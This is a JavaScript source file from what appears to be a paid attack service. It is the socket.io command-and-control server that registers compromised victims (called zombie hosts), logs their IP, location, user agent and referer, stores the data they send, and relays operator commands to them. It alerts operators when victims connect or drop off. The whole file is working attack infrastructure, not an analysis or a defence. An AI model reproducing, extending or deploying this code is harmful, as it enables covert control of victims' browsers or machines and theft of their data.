//
//  蚁弹超人:主机管理
//
var io = require('socket.io'),
    qqwry = require("lib-qqwry").info();

module.exports = function(app, db, udb, fc, path, handler) {
    var HOST = {
        socket: null,
        //= 初始化
        init: function() {
            var self = HOST;
            self.socket = io.listen(handler);
            self.socket.on('connect', function(sock) {
                if (!sock) {
                    return false;
                }
                sock
                //- 肉鸡上线
                .on('server', function(pid) {
                    pid = fc.toStr(pid);
                    //  获取项目信息
                    db.project.findOne({
                        pid: pid
                    }, function(err, project) {
                        //  项目不存在
                        if (!project) {
                            return sock.emit('init', {
                                err: 'not this project!',
                                ret: false
                            })
                        }
                        //  注册肉鸡信息
                        self.client.reg(fc.toStr(sock.id), sock, project);
                    })
                })
                //- 用户上线
                .on('client', function(uid, sendmail) {
                    uid = fc.toStr(uid);
                    //  用户如果没有登录在线则返回
                    if (!self.users.cache[uid]) {
                        return this.emit('init', false);
                    }
                    //  注册用户信息
                    self.users.reg(uid, this, sendmail ? true : false);
                });
            });
        },
        //= 主机连接事件
        client: {
            cache: {},
            reg: function(sid, sock, project) {
                //  上线信息
                var self = HOST.client,
                    ip = fc.getIP(null, sock.handshake.address),
                    ad = qqwry.searchIP(ip),
                    ua = fc.toStr(sock.handshake.headers['user-agent'] || ''),
                    addr = fc.toStr(ad.Country + ' ' + ad.Area),
                    referer = fc.toStr(sock.handshake.headers['referer'] || '');
                //  注册缓存
                self.cache[sid] = sock;
                //  存放到数据库
                new db.hosts({
                    user: project.user,
                    project: project._id,
                    ip: ip,
                    ua: ua,
                    sid: sid,
                    addr: addr,
                    data: '',
                    online: true,
                    referer: referer,
                    ctime: fc.now(),
                    utime: fc.now()
                }).save(function(err, host) {
                    if (!host) {
                        return false;
                    };
                    //  通知肉鸡注册成功
                    sock.emit('init', {
                        err: err,
                        ret: host
                    });
                    //  通知用户
                    self.online(sid, project, host);
                    // HOST.users.cache[project.user] ? HOST.users.cache[project.user].emit('online', host, project.name) : null;
                    //  监听肉鸡信息
                    self.listen(sid, project, host);
                })
            },
            listen: function(sid, project, host) {
                var self = HOST.client,
                    _SAVEDATA = '',
                    _TIMEER = null;
                //  间隔时间判断是否存活
                _TIMEER = setInterval(function() {
                    HOST.client.offline(sid, project.user, host);
                    clearInterval(this);
                }, 1000 * 20);
                //  处理数据
                if (!HOST.client.cache[sid]) {
                    return false;
                }
                HOST.client.cache[sid]
                .on('disconnect', function(sock) {
                    HOST.client.offline(sid, project.user, host);
                })
                .on('save', function(data) {
                    _SAVEDATA += fc.toStr(data);
                    db.hosts.update({
                        _id: host._id
                    }, {$set: {
                        data: _SAVEDATA.replace(/\n$/, '')
                    }}, function() {})
                })
                .on('alive', function() {
                    clearInterval(_TIMEER);
                    self.online(sid, project, host);
                    _TIMEER = setInterval(function() {
                        HOST.client.offline(sid, project.user, host);
                        clearInterval(this);
                    }, 1000 * 20);
                })
                .on('plugin-sender', function(data) {
                    // HOST.users.send(project.user, 'plugin-listener', data);
                    HOST.users.send(project.user, 'plugin-listener', {
                        sid: sid,
                        data: data
                    })
                })
            },
            send: function(sid, act, data) {
                var target = HOST.client.cache[fc.toStr(sid)];
                target ? target.emit(act, data) : null;
            },
            online: function(sid, project, host) {
                db.hosts.update({
                    sid: sid
                }, {$set: {
                    online: true,
                    utime: fc.now()
                }}, function(err, ret) {
                    HOST.users.send(project.user, 'online', {
                        host: host,
                        project: project.name
                    });
                })
            },
            offline: function(sid, user, host) {
                if (!HOST.client.cache[sid]) {
                    return false;
                };
                db.hosts.update({
                    sid: sid
                }, {$set: {
                    online: false,
                    utime: fc.now()
                }}, function(err, ret) {
                    HOST.users.send(user, 'offline', host);
                    delete HOST.client.cache[sid];
                });
            }
        },
        //= 用户连接
        users: {
            cache: {},
            mails: {},
            reg: function(uid, sock, sendmail) {
                var self = HOST.users;
                self.cache[uid] = sock;
                self.cache[uid].emit('init', true);
                self.listen(uid);
                // udb.update({
                //     _id: uid
                // }, {$set: {
                //     bomb_sendmail: sendmail ? true : false
                // }}, function() {})
            },
            listen: function(uid) {
                HOST.users.cache[uid]
                .on('plugin-sender', function(sid, data) {
                    HOST.client.send(sid, 'plugin-sender', data);
                })
                .on('plugin-listener', function(sid, data) {
                    HOST.client.send(sid, 'plugin-listener', data);
                })
            },
            send: function(uid, act, data) {
                var self = HOST.users,
                    user = self.cache[uid];
                if (user && typeof(user.emit) === 'function') {
                    user.emit(act, data);
                }else if (act === 'online') {
                    // udb.findOne({
                    //     _id: uid
                    // }, function(err, ret) {
                    //     if (ret && ret.bomb_sendmail) {
                    //         self.mail(data);
                    //     }
                    // })
                }
            },
            mail: function(data) {
                var self = HOST.users;
                if (!self.mails[data.host._id]) {
                    console.log('发送邮件', data);
                };
                self.mails[data.host._id] = true;
            }
        }
    }
    HOST.init();

    //  初始化用户连接对象
    app.route(path + 'hosts/init')
        .get(function(req, res) {
            fc.buyBomb(req, res, function(user) {
                //= 把用户在线的主机设置为离线
                db.hosts.update({
                    user: user._id
                }, {$set: {
                    online: false
                }}, {
                    multi: true
                }, function() {
                    // var _id = fc.md5(user._id + ':sock:' + new Date().getTime());
                    var _id = user._id;
                    HOST.users.cache[_id] = {};
                    res.end(_id);
                });
            })
        })
    //= 主机数据
    app.route(path + 'hosts/data')
        .get(function(req, res) {
            fc.buyBomb(req, res, function(user) {
                db.hosts.find({
                    user: user._id
                }).populate('project', 'name').exec(function(err, ret) {
                    var data = [];
                    ret.forEach(function(r) {
                        r.data = null;
                        data.push(r);
                    })
                    res.json({
                        err: err,
                        ret: data
                    })
                })
            })
        })
        .post(function(req, res) {
            fc.buyBomb(req, res, function(user) {
                db.hosts.findOne({
                    _id: fc.toStr(req.body.id)
                }, function(err, ret) {
                    res.json({
                        err: err,
                        ret: ret ? ret.data : false
                    })
                })
            })
        })
    //= 删除主机
    app.route(path + 'hosts/del')
        .post(function(req, res) {
            fc.buyBomb(req, res, function(user) {
                db.hosts.remove({
                    _id: {
                        $in: fc.toArr(req.body.ids)
                    },
                    user: user._id
                }, function(err, ret) {
                    res.json({
                        err: err,
                        ret: ret
                    })
                })
            })
        })
}